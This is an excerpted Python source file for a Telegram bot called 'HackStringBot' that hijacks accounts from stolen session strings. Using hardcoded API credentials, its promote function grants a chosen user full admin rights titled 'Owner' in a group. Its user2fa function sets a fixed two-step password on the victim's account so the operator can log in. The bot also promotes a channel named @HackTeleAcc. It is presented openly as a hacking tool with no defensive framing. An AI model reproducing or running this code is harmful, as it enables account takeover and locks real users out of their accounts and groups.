...
Bot_Username =os.environ.get("BOT_USERNAME", None) or "HackStringBot"
...
async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, pin_messages=True, anonymous=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=True, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X.edit_2fa('LEGENDBOT IS BEST')
      return True
    except:
      return False
...
'''
mm = '''
**⚜NOTICE FIRST JOIN GROUP @HackTeleAcc⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/ItsLegendBoy")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    legendbye = [
      [
        Button.url("Must Join", f"https://t.me/TheTelegramBotz")
        ]
      ]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply("User don't have two step thats why now two step is `LegendBot Is best` you can login now\n\nThanks For using LegendBoy Bot.", buttons=keyboard)
      else:
